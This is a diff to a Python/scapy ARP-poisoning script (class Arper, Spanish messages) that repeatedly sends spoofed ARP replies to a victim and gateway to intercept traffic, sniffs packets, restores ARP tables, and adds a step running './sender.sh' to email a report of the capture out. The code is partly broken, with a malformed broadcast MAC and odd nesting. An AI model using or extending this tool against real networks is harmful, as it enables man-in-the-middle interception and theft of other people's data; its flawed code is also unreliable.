@@ -1,10 +1,15 @@
 import datetime
 from warnings import filterwarnings
 filterwarnings("ignore")
+import argparse
+import subprocess
 import logging
 from os import *
 import shutil
 import sys
+import time
+from multiprocessing import Process
+import keys
 from scapy.all import *
 def get_mac(targetip):
 	packet = Ether(dst='ff:ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=targetip)
@@ -58,15 +63,28 @@ class Arper():
 		logger.info(f'Iniciando envenenamiento ARP')
 		time.sleep(2)
 		logger.info(f'Sniffing {count} packets...')
-		while True:
-			sys.stdout.write('.')
-			sys.stdout.flush()
-			try:
-				send(poison_victim)
-				send(poison_gateway)
-			except:
+		x=0
+		while x<=20:
+			while True:
+				x+=1
+				sys.stdout.write('.')
+				sys.stdout.flush()
+				try:
+					send(poison_victim)
+					send(poison_gateway)
+					if x>20:
+						break
+				except:
+					if x > 20:
+						self.restore()
+						sys.exit()
+				else:
+					time.sleep(1)
+					if x > 20:
+						break
+			if x >20:
 				self.restore()
-				sys.exit()
+				break
 		def sniff(self, count=20):
 			time.sleep(1)
 			bpf_filter = "ip host %s" % victim
@@ -80,6 +98,16 @@ class Arper():
 		logger.info('\nRestaurando tablas ARP')
 		time.sleep(1)
 		logger.info('\nTablas ARP restauradas...')
+
+		try:
+			time.sleep(1)
+			logger.info('Enviando reporte al mail...')
+			time.sleep(2)
+			subprocess.run('./sender.sh', shell=True)
+			logger.info('Reporte enviado exitosamente!...')
+			time.sleep(2)
+		except:
+			print('Reporte fallido, intente de nuevo...')
 
 		send(ARP(
 				op=2,
